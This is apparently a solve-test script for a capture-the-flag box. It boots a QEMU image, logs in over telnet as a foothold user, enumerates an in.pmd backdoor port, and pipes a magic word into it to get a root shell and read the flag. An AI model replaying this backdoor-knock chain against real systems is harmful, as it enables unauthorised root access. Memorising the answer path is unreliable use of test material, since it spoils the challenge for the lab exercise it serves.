#!/usr/bin/env python3
"""Box 4 "the backdoor" SOLVE TEST.  Walk the intended chain over telnet:

    telnet brian -> enumerate (netstat + the intruder's notes reveal the in.pmd
    backdoor on port $BPORT) -> knock with the magic word -> root shell over the
    inetd socket -> read the off-disk flag.

Exits 0 only if a uid=0 shell is reached through the backdoor AND the real flag
(not the decoy) is recovered.
"""
import os, socket, subprocess, sys, time
import pexpect

QEMU   = os.environ.get("QEMU_BIN", "qemu-system-i386")
IMAGE  = os.environ["BOX_IMAGE_ABS"]
MACHINE= os.environ.get("BOX_MACHINE", "pc")
CPU    = os.environ.get("BOX_CPU", "pentium")
MEM    = os.environ.get("BOX_MEM_MB", "128")
TPORT  = os.environ.get("BOX_FWD_TELNET", "2323")
FPORT  = os.environ.get("BOX_FWD_FTP", "2121")
SPORT  = os.environ.get("BOX_FWD_SHELL", "5514")
FUSER  = os.environ.get("BOX_FOOTHOLD_USER", "brian")
FPASS  = os.environ.get("BOX_FOOTHOLD_PASS", "newriver")
BPORT  = os.environ.get("BOX_BACKDOOR_PORT", "5553")
BMAGIC = os.environ.get("BOX_BACKDOOR_MAGIC", "wank")
LOOTD  = os.environ.get("BOX_LOOT_DIR", "/var/adm/.loot")
LOOTN  = os.environ.get("BOX_LOOT_NAME", "flag.txt")
EXPECT = os.environ.get("BOX_EXPECT_FLAG", "")
DECOY  = os.environ.get("BOX_FLAG_DECOY", "")
SERLOG = os.environ.get("BOX_SOLVE_SERIAL", "work/solve4-serial.log")
NO_BOOT= os.environ.get("BOX_NO_BOOT")

def log(m): print(f"[solve4] {m}", file=sys.stderr, flush=True)
def reap(): subprocess.run(["pkill","-9","-f",os.path.basename(IMAGE)],check=False)

def boot_box():
    reap(); time.sleep(1)
    fwd=(f"hostfwd=tcp:127.0.0.1:{TPORT}-:23,hostfwd=tcp:127.0.0.1:{FPORT}-:21,"
         f"hostfwd=tcp:127.0.0.1:{SPORT}-:513")
    keyf=os.environ.get("BOX_LUKS_KEYFILE_ABS","")
    secret, drive = [], f"file={IMAGE},format=qcow2,if=ide,index=0,media=disk"
    if keyf and os.path.exists(keyf):
        secret=["-object",f"secret,id=sec0,file={keyf}"]; drive+=",encrypt.key-secret=sec0"
        log("(booting LUKS-encrypted image with key)")
    cmd=[QEMU,"-machine",f"{MACHINE},graphics=off","-cpu",CPU,"-m",MEM,*secret,
         "-drive",drive,"-boot","c","-display","none","-serial",f"file:{SERLOG}",
         "-monitor","none","-no-reboot","-netdev",f"user,id=n0,restrict=on,{fwd}",
         "-device","ne2k_pci,netdev=n0"]
    log("booting box (host-only, telnet on 127.0.0.1:%s)"%TPORT)
    return subprocess.Popen(cmd,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

def wait_telnet(deadline):
    log("waiting for multiuser boot + telnetd ...")
    while time.time()<deadline:
        try: socket.create_connection(("127.0.0.1",int(TPORT)),timeout=3).close(); log("telnet port is open"); return True
        except OSError: time.sleep(5)
    return False

def main():
    box=None if NO_BOOT else boot_box()
    if NO_BOOT: log("BOX_NO_BOOT: solving an already-running box on 127.0.0.1:%s"%TPORT)
    try:
        if not wait_telnet(time.time()+600):
            log("telnetd never came up — see %s"%SERLOG); return 1
        tn=None
        for attempt in range(16):
            time.sleep(10)
            tn=pexpect.spawn(f"telnet 127.0.0.1 {TPORT}",encoding="latin-1",timeout=60)
            tn.logfile_read=open(SERLOG.replace(".log","-telnet.log"),"w",encoding="latin-1")
            try: tn.expect(r"login:",timeout=30); break
            except (pexpect.TIMEOUT,pexpect.EOF):
                log(f"telnet attempt {attempt+1}: no login yet, retry"); tn=None
        if tn is None: log("no login prompt"); return 1

        # foothold
        tn.sendline(FUSER); tn.expect(r"[Pp]assword:",timeout=30); tn.sendline(FPASS)
        i=tn.expect([r"\$ ",r"% ",r"Login incorrect"],timeout=60)
        if i==2: log("FOOTHOLD FAILED"); return 2
        tn.sendline("stty -echo 2>/dev/null"); tn.expect([r"\$ ",r"% "],timeout=30)
        tn.sendline("PS1='BRIAN> '; export PS1"); tn.expect(r"BRIAN> ",timeout=30)
        log("foothold OK: logged in as %s"%FUSER)

        # enumerate: the backdoor port + the breadcrumb
        tn.sendline(f"netstat -a 2>/dev/null | grep {BPORT}"); tn.expect(r"BRIAN> ",timeout=30)
        log("netstat %s: %s"%(BPORT," ".join(tn.before.strip().split())[-100:]))
        tn.sendline("grep -i pmd /etc/inetd.conf /etc/services 2>&1"); tn.expect(r"BRIAN> ",timeout=30)
        log("inetd wiring: %s"%" ".join(tn.before.strip().split())[-140:])

        # knock: pipe the magic word + commands into the local backdoor port; the
        # flag materialises at boot, so retry the whole knock until it's the real one
        flag=""; uid0=False
        for attempt in range(12):
            tn.sendline("( echo %s; sleep 2; echo id; echo 'cat %s/%s'; echo exit ) "
                        "| telnet localhost %s 2>&1" % (BMAGIC, LOOTD, LOOTN, BPORT))
            tn.expect(r"BRIAN> ",timeout=90)
            body=tn.before
            if "uid=0" in body: uid0=True
            f=""
            for line in body.splitlines():
                if "BU{" in line: f=line[line.index("BU{"):].split("}")[0]+"}"; break
            if f and f!=DECOY: flag=f; break
            log("attempt %d: knock gave %s"%(attempt+1, "decoy (flag not materialised)" if f==DECOY else "no root/flag yet"))
            time.sleep(6)
        if not uid0:
            log("BACKDOOR FAILED: never saw uid=0 from the in.pmd knock"); return 4
        log("backdoor OK: uid=0 root shell via in.pmd '%s' on port %s"%(BMAGIC,BPORT))
        if not flag:
            log("FLAG FAILED: only decoy/none (gen-flag MFS?)"); return 6
        log("flag recovered: %s"%flag)
        if EXPECT and flag!=EXPECT: log("FLAG MISMATCH: got %s expected %s"%(flag,EXPECT)); return 7
        log("=== SOLVE OK: foothold -> find backdoor -> knock -> root -> flag ===")
        print(flag); return 0
    except (pexpect.TIMEOUT,pexpect.EOF) as e:
        log("%s during solve — see %s"%(type(e).__name__,SERLOG)); return 1
    finally:
        if not NO_BOOT:
            reap()
            if box is not None and box.poll() is None: box.terminate()

if __name__=="__main__": sys.exit(main())
